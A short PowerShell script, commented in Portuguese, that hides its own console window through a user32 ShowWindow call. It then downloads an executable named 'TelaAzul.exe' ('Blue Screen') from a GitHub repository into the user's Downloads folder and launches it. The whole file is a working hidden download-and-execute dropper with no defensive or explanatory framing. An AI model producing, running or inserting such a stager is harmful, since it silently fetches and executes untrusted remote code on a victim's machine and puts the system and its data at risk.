

$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)

# URL do arquivo
$url = "https://github.com/guibmodmenu/redtela2/raw/refs/heads/main/TelaAzul.exe"

# Pasta Downloads do usuário atual
$downloadsPath = "$env:USERPROFILE\Downloads"

# Extrai o nome do arquivo do link
$fileName = Split-Path $url -Leaf

# Caminho completo para salvar
$destino = Join-Path $downloadsPath $fileName

# Baixa o arquivo usando wget (Invoke-WebRequest)
wget $url -OutFile $destino

Write-Host "Arquivo baixado em: $destino"

# Executa o arquivo baixado
Start-Process $destino
